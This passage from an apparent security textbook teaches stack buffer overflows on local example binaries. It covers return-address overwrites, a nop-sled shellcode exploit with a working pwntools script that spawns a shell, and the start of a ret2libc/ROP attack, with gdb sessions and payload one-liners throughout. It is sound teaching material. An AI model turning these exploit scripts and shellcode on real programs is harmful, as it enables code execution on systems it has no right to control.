+ R10  0x726570206f74206e ('n to per')
+ R11  0x246
+ R12  0x4004e0 (_start) ◂— xor    ebp, ebp
+ R13  0x7fffffffdf90 ◂— 0x1
+ R14  0x0
+ R15  0x0
+ RBP  0x4141414141414141 ('AAAAAAAA')
+*RSP  0x7fffffffdec0 ◂— 0x0
+*RIP  0x4005e7 (win) ◂— push   rbp
+[───────────DISASM───────────]
+   0x400660 <main+87>     call   empty                         <0x4005d6>
+ 
+   0x400665 <main+92>     jmp    main+120                      <0x400681>
+    ↓
+   0x400681 <main+120>    mov    eax, 0
+   0x400686 <main+125>    leave  
+   0x400687 <main+126>    ret    
+    ↓
+ ► 0x4005e7 <win>         push   rbp
+   0x4005e8 <win+1>       mov    rbp, rsp
+   0x4005eb <win+4>       mov    edi, 0x40074a
+   0x4005f0 <win+9>       call   puts@plt                      <0x400490>
+ 
+   0x4005f5 <win+14>      nop    
+   0x4005f6 <win+15>      pop    rbp
+[────────────STACK────────────]
+00:0000│ rsp  0x7fffffffdec0 ◂— 0x0
+01:0008│      0x7fffffffdec8 —▸ 0x7fffffffdf98 —▸ 0x7fffffffe2a5 ◂— 0x65642f656d6f682f ('/home/de')
+02:0010│      0x7fffffffded0 ◂— 0x100000000
+03:0018│      0x7fffffffded8 —▸ 0x400609 (main) ◂— push   rbp
+04:0020│      0x7fffffffdee0 ◂— 0x0
+05:0028│      0x7fffffffdee8 ◂— 0x7c6654f0a1383abe
+06:0030│      0x7fffffffdef0 —▸ 0x4004e0 (_start) ◂— xor    ebp, ebp
+07:0038│      0x7fffffffdef8 —▸ 0x7fffffffdf90 ◂— 0x1
+[───────────BACKTRACE───────────]
+ ► f 0           4005e7 win
+   f 1                0
+pwndbg> c
+Continuing.
+Access granted.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000000000000000 in ?? ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+[───────────REGISTERS───────────]
+*RAX  0x10
+ RBX  0x0
+ RCX  0x7ffff7b04290 (__write_nocancel+7) ◂— cmp    rax, -0xfff
+ RDX  0x7ffff7dd3780 (_IO_stdfile_1_lock) ◂— 0x0
+ RDI  0x1
+ RSI  0x602010 ◂— 0x6720737365636341 ('Access g')
+*R8   0x7ffff7fce700 ◂— 0x7ffff7fce700
+ R9   0x6f697373696d7265 ('ermissio')
+ R10  0x726570206f74206e ('n to per')
+ R11  0x246
+ R12  0x4004e0 (_start) ◂— xor    ebp, ebp
+ R13  0x7fffffffdf90 ◂— 0x1
+ R14  0x0
+ R15  0x0
+ RBP  0x4141414141414141 ('AAAAAAAA')
+*RSP  0x7fffffffdec8 —▸ 0x7fffffffdf98 —▸ 0x7fffffffe2a5 ◂— 0x65642f656d6f682f ('/home/de')
+*RIP  0x0
+[───────────DISASM───────────]
+Invalid address 0x0
+
+
+
+
+
+
+
+
+
+
+[────────────STACK────────────]
+00:0000│ rsp  0x7fffffffdec8 —▸ 0x7fffffffdf98 —▸ 0x7fffffffe2a5 ◂— 0x65642f656d6f682f ('/home/de')
+01:0008│      0x7fffffffded0 ◂— 0x100000000
+02:0010│      0x7fffffffded8 —▸ 0x400609 (main) ◂— push   rbp
+03:0018│      0x7fffffffdee0 ◂— 0x0
+04:0020│      0x7fffffffdee8 ◂— 0x7c6654f0a1383abe
+05:0028│      0x7fffffffdef0 —▸ 0x4004e0 (_start) ◂— xor    ebp, ebp
+06:0030│      0x7fffffffdef8 —▸ 0x7fffffffdf90 ◂— 0x1
+07:0038│      0x7fffffffdf00 ◂— 0x0
+[───────────BACKTRACE───────────]
+ ► f 0                0
+   f 1     7fffffffdf98
+   f 2        100000000
+   f 3           400609 main
+   f 4                0
+Program received signal SIGSEGV (fault address 0x0)
+pwndbg> 
+\end{lstlisting}
+
+As expected, we were able to successfully overwrite the return address with the
+address of \texttt{win()}. This caused \texttt{win()} to execute after the
+program returned from \texttt{main()}. Verify that this works outside of
+\texttt{gdb} as well.
+
+\begin{lstlisting}
+> python -c "print 'A' * 80 + '\xe7\x05\x40\x00\x00\x00\x00\x00'" | ./ret_overwrite 
+Enter the password:
+You don't have permission to perform this action.
+Access granted.
+Segmentation fault
+> 
+\end{lstlisting}
+
+You'll notice that the program crashes after returning from \texttt{win()}. This
+is because \texttt{win()} expects a return address on top of the stack when it
+is called, but when we call it only a null pointer is there. If we were to put a
+valid address there, say the address of \texttt{lose()}, the instructions at
+that address would be called after the program returns from \texttt{win()}.
+
+\begin{lstlisting}
+> readelf --symbols ./ret_overwrite | grep lose
+    51: 00000000004005f8    17 FUNC    GLOBAL DEFAULT   14 lose
+> python -c "print 'A' * 80 + '\xe7\x05\x40\x00\x00\x00\x00\x00' + '\xf8\x05\x40\x00\x00\x00\x00\x00'" | ./ret_overwrite 
+Enter the password:
+You don't have permission to perform this action.
+Access granted.
+Invalid auth token.
+Segmentation fault
+> 
+\end{lstlisting}
+
+We can do this as many times as we want. The more valid return addresses we
+write to the stack, the more functions will be called after we exit from
+\texttt{main()}. Note however that the base pointer was clobbered during the
+overflow, so any functions (such as \texttt{main()}) that use it to access local
+variables will almost certainly crash.
+
+\begin{lstlisting}
+> python -c "print 'A' * 80 + '\xe7\x05\x40\x00\x00\x00\x00\x00' * 10" | ./ret_overwrite 
+Enter the password:
+You don't have permission to perform this action.
+Access granted.
+Access granted.
+Access granted.
+Access granted.
+Access granted.
+Access granted.
+Access granted.
+Access granted.
+Access granted.
+Access granted.
+Segmentation fault
+> readelf --symbols ./ret_overwrite | grep main
+     3: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_main@GLIBC_2.2.5 (2)
+    55: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_main@@GLIBC_
+    66: 0000000000400609   127 FUNC    GLOBAL DEFAULT   14 main
+> python -c "print 'A' * 80 + '\xe7\x05\x40\x00\x00\x00\x00\x00' + '\x09\x06\x40\x00\x00\x00\x00\x00'" | ./ret_overwrite 
+Enter the password:
+You don't have permission to perform this action.
+Access granted.
+Segmentation fault
+\end{lstlisting}
+
+An implementation of this solution in \texttt{pwntools} is below. This solution
+uses the ELF module \texttt{pwntools} in order to find the location of
+\texttt{win()} programmatically.
+
+\begin{lstlisting}
+#!/usr/bin/python
+from pwn import *
+
+e = ELF("./ret_overwrite")
+win_address = e.symbols["win"]
+
+p = process("./ret_overwrite")
+p.sendline("A" * 80 + p64(win_address))
+print p.recv()
+> 
+\end{lstlisting}
+
+When run, the program calls \texttt{win()} as desired.
+
+\begin{lstlisting}
+> ./ret_overwrite_solution.py
+[*] '/home/devneal/Security/REFE/textbook/example_code/ret_overwrite'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[+] Starting local process './ret_overwrite': pid 19694
+Enter the password:
+You don't have permission to perform this action.
+Access granted.
+
+[*] Stopped process './ret_overwrite' (pid 19694)
+>
+\end{lstlisting}
+
+% shellcode, nop sled
+\subsection{Shellcoding}
+Although overwriting the return address gives us great control over a program,
+we are still limited to executing commands which are already contained in the
+binary. Shellcoding will allow us to escape this limitation and execute
+arbitrary commands after launching our exploit. The idea is include instructions
+to spawn a shell in our input, then overwrite the return address with the
+location where those instructions are written. This idea is conceptually simple,
+but there are a few details which introduce some complexity.
+
+\begin{enumerate}
+    \item We must know the address where our input will be written ahead of
+        time \emph{outside} of \texttt{gdb}
+    \item We must acquire machine code to spawn a shell
+\end{enumerate}
+
+We'll use \texttt{ret\_overwrite.c} again for this example, but we have to
+compile it with an additional flag: \texttt{-z execstack}. The source is
+reproduced below.
+
+\begin{lstlisting}
+#include <stdio.h>
+#include <string.h>
+
+void empty(void) {
+    printf("You don't have permission to perform this action.\n");
+}
+
+void win(void) {
+    printf("Access granted.\n");
+}
+
+void lose(void) {
+    printf("Invalid auth token.\n");
+}
+
+typedef struct auth {
+    long int token;
+    char buf[64];
+} auth;
+
+int main(void) {
+    auth a;
+    memset(a.buf, 0, 64);
+    a.token = 0;
+
+    printf("Enter the password:\n");
+    scanf("%s", a.buf);
+
+    if (a.token == 0) {
+        empty();
+    } else if (a.token == 0xdeadbeef) {
+        win();
+    } else {
+        lose();
+    }
+}
+\end{lstlisting}
+
+Recall from the previous section that the return address is located 80
+characters after the buffer where our input is written. This means we have 80
+characters to write our machine code, which we will follow with the address of
+\texttt{buf}. We can use \texttt{gdb} to \emph{approximately} find
+\texttt{buf}'s address, but \texttt{gdb} adds some environment variables when
+debugging a program. Since environment variables are stored near the bottom of
+the stack, the addresses it reports will be lower than those during normal
+execution. Unfortunately, it is difficult to accurately predict how much
+\texttt{gdb} will undershoot the addresses. Fortunately, there is a way to deal
+with this uncertainty. x86 assembly has a \texttt{nop} instruction, whose
+purpose is to do absolutely nothing. If we overflow the buffer with \texttt{nop}
+instructions instead of `A's, and overwrite the return address with \emph{any}
+address where a \texttt{nop} instruction is written, then the CPU will execute
+all of the following \texttt{nop}s one after another, until it finally executes
+our shellcode. The string of \texttt{nop}s is called a nop sled, and it
+effectively grants us a margin of error when predicting addresses. This still
+isn't enough to reliably jump to our shellcode, but it is enough to make it
+feasible to try several different addresses, each about half the length of our
+\texttt{nop} sled away from each other. Our final exploit will have the form
+\texttt{nop\_sled + shellcode + sled\_address}, where \texttt{sled\_address} is
+a guess of the location of the \texttt{nop} sled. We will craft several of these
+inputs, each with a different guess, and send the program each of them in turn
+until one of them grants us a shell.
+
+\subsubsection{Crafting with \texttt{pwndbg} and \texttt{pwntools}}
+Before we can start writing the exploit, we must first get find the approximate
+location of \texttt{buf} with \texttt{gdb}. Let's do it.
+
+\begin{lstlisting}
+> gdb shellcode
+GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
+Copyright (C) 2016 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Loaded 113 commands. Type pwndbg [filter] for a list.
+Reading symbols from shellcode...(no debugging symbols found)...done.
+pwndbg> disassemble main
+Dump of assembler code for function main:
+   0x0000000000400609 <+0>:	push   rbp
+   0x000000000040060a <+1>:	mov    rbp,rsp
+   0x000000000040060d <+4>:	sub    rsp,0x50
+   0x0000000000400611 <+8>:	lea    rax,[rbp-0x50]
+   0x0000000000400615 <+12>:	add    rax,0x8
+   0x0000000000400619 <+16>:	mov    edx,0x40
+   0x000000000040061e <+21>:	mov    esi,0x0
+   0x0000000000400623 <+26>:	mov    rdi,rax
+   0x0000000000400626 <+29>:	call   0x4004a0 <memset@plt>
+   0x000000000040062b <+34>:	mov    QWORD PTR [rbp-0x50],0x0
+   0x0000000000400633 <+42>:	mov    edi,0x40076e
+   0x0000000000400638 <+47>:	call   0x400490 <puts@plt>
+   0x000000000040063d <+52>:	lea    rax,[rbp-0x50]
+   0x0000000000400641 <+56>:	add    rax,0x8
+   0x0000000000400645 <+60>:	mov    rsi,rax
+   0x0000000000400648 <+63>:	mov    edi,0x400782
+   0x000000000040064d <+68>:	mov    eax,0x0
+   0x0000000000400652 <+73>:	call   0x4004c0 <__isoc99_scanf@plt>
+   0x0000000000400657 <+78>:	mov    rax,QWORD PTR [rbp-0x50]
+   0x000000000040065b <+82>:	test   rax,rax
+   0x000000000040065e <+85>:	jne    0x400667 <main+94>
+   0x0000000000400660 <+87>:	call   0x4005d6 <empty>
+   0x0000000000400665 <+92>:	jmp    0x400681 <main+120>
+   0x0000000000400667 <+94>:	mov    rdx,QWORD PTR [rbp-0x50]
+   0x000000000040066b <+98>:	mov    eax,0xdeadbeef
+   0x0000000000400670 <+103>:	cmp    rdx,rax
+   0x0000000000400673 <+106>:	jne    0x40067c <main+115>
+   0x0000000000400675 <+108>:	call   0x4005e7 <win>
+   0x000000000040067a <+113>:	jmp    0x400681 <main+120>
+   0x000000000040067c <+115>:	call   0x4005f8 <lose>
+   0x0000000000400681 <+120>:	mov    eax,0x0
+   0x0000000000400686 <+125>:	leave  
+   0x0000000000400687 <+126>:	ret    
+End of assembler dump.
+pwndbg> b *main+73
+Breakpoint 1 at 0x400652
+pwndbg> r
+Starting program: /home/devneal/Security/REFE/textbook/example_code/shellcode 
+Enter the password:
+
+Breakpoint 1, 0x0000000000400652 in main ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+[───────────REGISTERS───────────]
+ RAX  0x0
+ RBX  0x0
+*RCX  0x7ffff7b04290 (__write_nocancel+7) ◂— cmp    rax, -0xfff
+*RDX  0x7ffff7dd3780 (_IO_stdfile_1_lock) ◂— 0
+*RDI  0x400782 ◂— and    eax, 0x73 /* '%s' */
+*RSI  0x7fffffffde88 ◂— 0x0
+*R8   0x602000 ◂— 0x0
+*R9   0xd
+*R10  0x7ffff7dd1b78 (main_arena+88) —▸ 0x602410 ◂— 0x0
+*R11  0x246
+*R12  0x4004e0 (_start) ◂— xor    ebp, ebp
+*R13  0x7fffffffdfb0 ◂— 0x1
+ R14  0x0
+ R15  0x0
+*RBP  0x7fffffffded0 —▸ 0x400690 (__libc_csu_init) ◂— push   r15
+*RSP  0x7fffffffde80 ◂— 0x0
+*RIP  0x400652 (main+73) ◂— call   0x4004c0
+[───────────DISASM───────────]
+ ► 0x400652 <main+73>            call   __isoc99_scanf@plt            <0x4004c0>
+        format: 0x400782 ◂— 0x1b01000000007325 /* '%s' */
+        vararg: 0x7fffffffde88 ◂— 0x0
+ 
+   0x400657 <main+78>            mov    rax, qword ptr [rbp - 0x50]
+   0x40065b <main+82>            test   rax, rax
+   0x40065e <main+85>            jne    main+94                       <0x400667>
+ 
+   0x400660 <main+87>            call   empty                         <0x4005d6>
+ 
+   0x400665 <main+92>            jmp    main+120                      <0x400681>
+    ↓
+   0x400681 <main+120>           mov    eax, 0
+   0x400686 <main+125>           leave  
+   0x400687 <main+126>           ret    
+ 
+   0x400688                      nop    dword ptr [rax + rax]
+   0x400690 <__libc_csu_init>    push   r15
+[────────────STACK────────────]
+00:0000│ rsp  0x7fffffffde80 ◂— 0x0
+... ↓
+[───────────BACKTRACE───────────]
+ ► f 0           400652 main+73
+   f 1     7ffff7a2d830 __libc_start_main+240
+Breakpoint *main+73
+pwndbg> quit
+> 
+\end{lstlisting}
+
+We can tell from the argument to \texttt{scanf()} that \texttt{buf} is located
+at \texttt{0x7fffffffde88}. This is the address we'll use to overwrite the
+return address.
+
+This is all the information we need to write our exploit. Although it may seem
+to involve a lot of work, it is actually quite simple to automate with
+\texttt{pwntools}. Of particular importance are the \texttt{shellcraft} module,
+which provides functions for generating shellcode, and the \texttt{asm} module,
+which provides utilities for assembling and disassembling code. 
+
+% TODO: remove the escape from the $
+\begin{lstlisting}
+>>> from pwn import *
+>>> context.arch = "amd64"
+>>> shellcode = shellcraft.sh()
+>>> print shellcode
+    /* execve(path='/bin///sh', argv=['sh'], envp=0) */
+    /* push '/bin///sh\x00' */
+    push 0x68
+    mov rax, 0x732f2f2f6e69622f
+    push rax
+    mov rdi, rsp
+    /* push argument array ['sh\x00'] */
+    /* push 'sh\x00' */
+    push 0x1010101 ^ 0x6873
+    xor dword ptr [rsp], 0x1010101
+    xor esi, esi /* 0 */
+    push rsi /* null terminate */
+    push 8
+    pop rsi
+    add rsi, rsp
+    push rsi /* 'sh\x00' */
+    mov rsi, rsp
+    xor edx, edx /* 0 */
+    /* call execve() */
+    push SYS_execve /* 0x3b */
+    pop rax
+    syscall
+
+>>> shell = run_assembly(shellcode)
+[*] '/tmp/pwn-asm-EIMiA2/step3'
+    Arch:     amd64-64-little
+    RELRO:    No RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      No PIE (0x10000000)
+    RWX:      Has RWX segments
+[x] Starting local process '/tmp/pwn-asm-EIMiA2/step3'
+[+] Starting local process '/tmp/pwn-asm-EIMiA2/step3': pid 22248
+>>> shell.interactive()
+[*] Switching to interactive mode
+whoami
+devneal
+exit
+[*] Got EOF while reading in interactive
+
+[*] Process '/tmp/pwn-asm-EIMiA2/step3' stopped with exit code 0 (pid 22248)
+[*] Got EOF while sending in interactive
+>>> asm(shellcode)
+'jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814\$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05'
+>>> 
+\end{lstlisting}
+
+Both the \texttt{shellcraft} and \texttt{asm} modules behave differently
+depending on which architecture is required. We specify the amd64 architecture
+with \texttt{context.arch = "amd64"}. \texttt{shellcraft.amd64.sh()} returns
+shellcode for the target architecture. We can test that this (or any other
+assembly) works by passing it to \texttt{run\_assembly()} and verify that it
+spawns a shell. If we pass the shellcode to \texttt{asm()}, it will assemble
+those instructions and return the resulting machine code. This is the machine
+code we'll use in our exploit.
+
+There is one more detail to be aware of before we can start writing. After we
+overflow the buffer and the program executes the \texttt{ret} instruction at the
+end of \texttt{main()}, the stack pointer will point one machine word below our
+guessed address. But the shellcode includes seven \texttt{push} instructions.
+This means that if we try to use this exploit naively the shellcode will
+overwrite itself as it executes, resulting in a crash. To remedy this, we first
+add 7 machine words worth of space to \texttt{rsp} before running the shellcode.
+
+Below is an implementation of the exploit described above.
+\begin{lstlisting}
+#!/usr/bin/python
+from pwn import *
+import sys
+
+context.arch   = "amd64"
+debug_buf_addr = 0x7fffffffde88
+guessing_range = 200
+
+def payload(offset):
+    return sled + shellcode + p64(debug_buf_addr + offset)
+
+shellcode = asm("add rsp, 0x38") + asm(shellcraft.sh())
+sled = asm("nop") * (80 - len(shellcode))
+
+# use the specified offset if provided
+if len(sys.argv) > 1:
+    p = process("./shellcode", aslr=False)
+    p.sendline(payload(int(sys.argv[1])))
+    p.interactive()
+    exit(0)
+
+# guess several offsets and store the ones that work
+working_offsets = []
+for offset in range(-guessing_range, guessing_range, len(sled) / 2):
+    log.info("Trying offset {}".format(offset))
+    p = process("./shellcode", aslr=False)
+    p.sendline(payload(offset))
+    p.readuntil("action.\n")
+
+    # trying sending a shell command and checking the response
+    try:
+        p.sendline("whoami")
+        if p.recv(timeout=0.1) != "":
+            log.success("Offset {} works!!!".format(offset))
+            working_offsets.append(offset)
+    except EOFError:
+        pass
+
+if working_offsets:
+    # spawn a shell using the average working offset
+    avg_offset = sum(working_offsets) / len(working_offsets)
+    log.success("Spawning shell with offset {}".format(avg_offset))
+    shell = process("./shellcode", aslr=False)
+    shell.sendline(payload(avg_offset))
+    shell.interactive()
+else:
+    log.failure("No working offsets found")
+\end{lstlisting}
+
+This exploit gives the following output when run:
+
+\begin{lstlisting}
+> ./shellcode_solution.py
+[*] Trying offset -200
+[+] Starting local process './shellcode': pid 18710
+[!] ASLR is disabled!
+[*] Trying offset -186
+[+] Starting local process './shellcode': pid 18712
+[*] Trying offset -172
+[+] Starting local process './shellcode': pid 18714
+[*] Process './shellcode' stopped with exit code -11 (SIGSEGV) (pid 18714)
+[*] Trying offset -158
+[+] Starting local process './shellcode': pid 18716
+[*] Process './shellcode' stopped with exit code -4 (SIGILL) (pid 18716)
+[*] Trying offset -144
+[+] Starting local process './shellcode': pid 18718
+[*] Trying offset -130
+[+] Starting local process './shellcode': pid 18720
+[*] Trying offset -116
+[+] Starting local process './shellcode': pid 18722
+[*] Trying offset -102
+[+] Starting local process './shellcode': pid 18724
+[*] Trying offset -88
+[+] Starting local process './shellcode': pid 18726
+[*] Trying offset -74
+[+] Starting local process './shellcode': pid 18728
+[*] Trying offset -60
+[+] Starting local process './shellcode': pid 18730
+[*] Trying offset -46
+[+] Starting local process './shellcode': pid 18732
+[*] Trying offset -32
+[+] Starting local process './shellcode': pid 18734
+[*] Trying offset -18
+[+] Starting local process './shellcode': pid 18736
+[*] Trying offset -4
+[+] Starting local process './shellcode': pid 18738
+[*] Trying offset 10
+[+] Starting local process './shellcode': pid 18740
+[*] Trying offset 24
+[+] Starting local process './shellcode': pid 18742
+[*] Trying offset 38
+[+] Starting local process './shellcode': pid 18744
+[*] Trying offset 52
+[+] Starting local process './shellcode': pid 18746
+[+] Offset 52 works!!!
+[*] Trying offset 66
+[+] Starting local process './shellcode': pid 18749
+[+] Offset 66 works!!!
+[*] Trying offset 80
+[+] Starting local process './shellcode': pid 18752
+[*] Trying offset 94
+[+] Starting local process './shellcode': pid 18754
+[*] Trying offset 108
+[+] Starting local process './shellcode': pid 18756
+[*] Trying offset 122
+[+] Starting local process './shellcode': pid 18758
+[*] Trying offset 136
+[+] Starting local process './shellcode': pid 18760
+[*] Trying offset 150
+[+] Starting local process './shellcode': pid 18762
+[*] Trying offset 164
+[+] Starting local process './shellcode': pid 18764
+[*] Trying offset 178
+[+] Starting local process './shellcode': pid 18766
+[*] Trying offset 192
+[+] Starting local process './shellcode': pid 18768
+[+] Spawning shell with offset 73
+[+] Starting local process './shellcode': pid 18770
+[*] Switching to interactive mode
+Enter the password:
+You don't have permission to perform this action.
+$ whoami
+devneal
+$
+\end{lstlisting}
+
+As expected, the program spawns a shell. This is a remarkable result when you
+think about it. Starting from a program which does nothing but read input, check
+it, and print output, we have achieved arbitrary code execution!
+
+We managed to get a shell, but this is a pretty useless exploit in practice. Let
+us count the ways:
+
+\begin{enumerate}
+    \item The program must be compiled with \texttt{-fno-stack-protector}
+    \item The program must be compiled with \texttt{-z execstack}
+    \item Modern systems use a mitigation technique called Address Space Layout
+        Randomization (ASLR), which makes it impossible to use \texttt{gdb} to
+        learn stack addresses
+    \item It requires several guesses
+    \item The range of guesses can be arbitrarily large
+\end{enumerate}
+
+%TODO: find a reliable way to add environment variables
+The last point is due to the fact that the program can be run with arbitrarily
+many environment variables. One way to see this work is to run
+\texttt{/bin/bash} from within itself.
+
+\begin{lstlisting}
+> ./shellcode_solution.py 
+<truncated>
+[+] Spawning shell with offset 73
+[+] Starting local process './shellcode': pid 1083
+[*] Switching to interactive mode
+Enter the password:
+You don't have permission to perform this action.
+$ exit
+[*] Got EOF while reading in interactive
+$ 
+[*] Process './shellcode' stopped with exit code 0 (pid 1083)
+[*] Got EOF while sending in interactive
+
+> /bin/bash
+> ./shellcode_solution.py 
+<truncated>
+[+] Spawning shell with offset -81
+[+] Starting local process './shellcode': pid 3080
+[*] Switching to interactive mode
+Enter the password:
+You don't have permission to perform this action.
+$ exit
+[*] Got EOF while reading in interactive
+$ 
+[*] Process './shellcode' stopped with exit code 0 (pid 3080)
+[*] Got EOF while sending in interactive
+
+> /bin/bash
+> ./shellcode_solution.py 
+<truncated>
+[+] Starting local process './shellcode': pid 4402
+[-] No working offsets found
+> 
+\end{lstlisting}
+
+We generally have no information about a running process's environment when
+attempting to exploit it. Of course this wouldn't be a problem if we could
+somehow \emph{leak} an address from the program, but then there are better ways
+to get a shell.
+
+% ret2libc, stack faking
+\subsection{DEP, ROP, and ret2libc}
+% TODO: use pwndbg checksec, canary, retaddr, distance
+As was mentioned at the end of the previous section, programs are typically
+compiled with an NX bit, signifying that their stack and heap segments are not
+executable. You can verify this with the \texttt{checksec} utility (included
+with \texttt{pwntools}) or by running \texttt{readelf --segments} on a
+binary and checking the flags on the \texttt{GNU\_STACK} header. More generally,
+programs are compiled by default with write-xor-execute (W$\wedge$X) security,
+meaning that no section of memory is both writable and executable. If you think
+about this for a while, you'll realize this means that you can never write
+machine instructions to memory and hope to later execute them. This mitigation
+technique is called Data Executaion Preventaion (DEP), and it effectively
+defeats shellcode exploits.
+
+But this doesn't mean the end for stack based exploits. Even though we can't
+execute artificial malicious instructions, we \emph{can} execute the naturally
+occurring instructions in malicious ways. The idea is that rather than returning
+to code we control on the stack, we instead return to code that we \emph{don't}
+control - anywhere else in the program. While this may seem to greatly diminish
+our control, it turns out in many cases to be just as dangerous as executing
+shellcode.
+
+When a C program wants to execute library functions, it must first load or
+"map" that library into memory. And even if only one function is desired, the
+entire library is mapped. That means there are thousands of necessarily
+executable instructions just lying around in memory. And even though we didn't
+write any of them ourselves, we can still use them to take control of a
+program. Take system() for example. system() simply executes the string it is
+given as an argument. It's also part of libc, which means it is included in any
+dynamically linked program that uses libc functions. And if we can call it with
+the right argument, say \texttt{"/bin/sh"}, we can get a shell even if DEP is
+being used.
+
+Take a look at the following program, which is a slight modification of
+\texttt{ret\_overwrite.c}.
+
+\begin{lstlisting}
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+
+void empty(void) {
+    system("echo You don\\'t have permission to perform this action.");
+}
+
+void win(void) {
+    system("echo Access granted.");
+}
+
+void lose(void) {
+    system("echo Invalid auth token.");
+}
+
+typedef struct auth {
+    long int token;
+    char buf[64];
+} auth;
+
+int main(void) {
+    auth a;
+    memset(a.buf, 0, 64);
+    a.token = 0;
+
+    system("echo Enter the password:");
+    scanf("%s", a.buf);
+
+    if (a.token == 0) {
+        empty();
+    } else if (a.token == 0xdeadbeef) {
+        win();
+    } else {
+        lose();
+    }
+}
+\end{lstlisting}
+
+This program was compiled with \texttt{gcc -o ret2libc ret2libc.c
+-fno-stack-protector -static}. The only difference between this program and
+\texttt{ret\_overwrite.c} is that this one uses \texttt{system()} to print
+output rather than \texttt{printf()}. Our plan is to make this program spawn a
+shell by calling \texttt{system("/bin/sh")}. This binary is statically
+linked, which means that all of the shared library code it uses is located
+somewhere in the binary. In particular, this means that the code for
+\texttt{system()} is contained within the binary. \texttt{system()} contains
+"/bin/sh" in its code, so that string is somewhere in the binary as well. And
+since the program code is not affected by ALSR, the locations of
+\texttt{system()} and "/bin/sh" will be the same on every run. Things are
+shaping up pretty well for another exploit.
+
+It'd be easy enough to overwrite the return address with \texttt{system()}'s
+address, but we must first specify its argument, a string to be executed. Since
+we're working with x86-64, this argument must be written to \texttt{rdi} before
+we return to \texttt{system()}. We will acheive this by using a "pop ret
+gadget". Rather than placing only the location of \texttt{system()} at the end
+of our input, we will instead include three consecutive addresses:
+
+\begin{enumerate}
+    \item Any location in memory containing \texttt{pop rdi} followed by
+        \texttt{ret}
+    \item The location of ``/bin/sh''
+    \item The location of \texttt{system()}
+\end{enumerate}
+
+When our input is crafted as described above, the program will first
+\texttt{pop} the location of ``/bin/sh'' into \texttt{rdi}. It will then execute
+the following \texttt{ret} instruction, which will redirect execution to
+\texttt{system()} while ``/bin/sh'' is in \texttt{rdi} as the argument, granting
+us a shell.
+
+% TODO: introduce ROPgadget
+The only new task is to find the location of \texttt{pop rdi; ret}. This snippet
+of code is called a \emph{gadget}. Although it is possible to do this manually by
+searching for all of the \texttt{ret} instructions and searching backwards for
+\texttt{pop} instructions, it is much easier to use an automated tool like
+ROPgadget, and \texttt{grep} through the results.
+
+\begin{lstlisting}
+> ROPgadget --binary ret2libc | grep "pop rdi"
+0x0000000000430758 : pop rdi ; adc byte ptr [rdx + 8], dh ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
+0x000000000042c3fd : pop rdi ; add eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
+0x0000000000432179 : pop rdi ; in al, dx ; mov qword ptr [rdi - 0xc], rcx ; mov dword ptr [rdi - 4], edx ; ret
+0x0000000000431f89 : pop rdi ; in eax, dx ; mov qword ptr [rdi - 0xb], rcx ; mov dword ptr [rdi - 4], edx ; ret
+0x00000000004bbcde : pop rdi ; insd dword ptr [rdi], dx ; test eax, 0x7d4c8c5d ; ret 0xd8f
+0x0000000000441d82 : pop rdi ; jmp rax
+0x00000000004baca1 : pop rdi ; mov dh, 0x4e ; ret 0x474c
+0x000000000049e88e : pop rdi ; mov rax, rbx ; pop rbx ; pop rbp ; pop r12 ; ret
+0x0000000000431da9 : pop rdi ; out dx, al ; mov qword ptr [rdi - 0xa], rcx ; mov dword ptr [rdi - 4], edx ; ret
+0x0000000000431bd9 : pop rdi ; out dx, eax ; mov qword ptr [rdi - 9], r8 ; mov dword ptr [rdi - 4], edx ; ret
+0x0000000000431cd5 : pop rdi ; out dx, eax ; mov qword ptr [rdi - 9], rcx ; mov byte ptr [rdi - 1], dl ; ret
+0x0000000000431c21 : pop rdi ; out dx, eax ; mov qword ptr [rdi - 9], rcx ; mov dword ptr [rdi - 4], edx ; ret
+0x000000000040214a : pop rdi ; pop rbp ; ret
+0x0000000000401526 : pop rdi ; ret
+0x000000000047b90d : pop rdi ; std ; inc dword ptr [rbp - 0x76b48a40] ; ret
+> 
+\end{lstlisting}
+
+Luckily, the exact gadget we need is located at \texttt{0x401526}. If we include
+this address in our input and follow it with the location of "/bin/sh", the
+program will first \texttt{pop} the location of "/bin/sh" into \texttt{rdi},
+then redirect execution to any address we follow it with. We can find the
+location of "/bin/sh" with \texttt{pwndbg}, vanilla \texttt{gdb},
+\texttt{objdump}, and most importantly for our purposes, \texttt{pwntools}.
+
+\begin{lstlisting}
+> gdb -q ret2libc -batch -ex "start" -ex "search /bin/sh"
+Loaded 113 commands. Type pwndbg [filter] for a list.
+Temporary breakpoint 1 at 0x4009e5
+ret2libc        0x4a2168 0x68732f6e69622f /* '/bin/sh' */
+> 
+> gdb -nh -q ret2libc
+Reading symbols from ret2libc...(no debugging symbols found)...done.
+(gdb) b main
+Breakpoint 1 at 0x4009e5
+(gdb) r
+Starting program: /home/devneal/Security/REFE/textbook/example_code/ret2libc 
+
+Breakpoint 1, 0x00000000004009e5 in main ()
+(gdb) info proc mappings 
+process 4527
+Mapped address spaces:
+
+          Start Addr           End Addr       Size     Offset objfile
+            0x400000           0x4ca000    0xca000        0x0 /home/devneal/Security/REFE/textbook/example_code/ret2libc
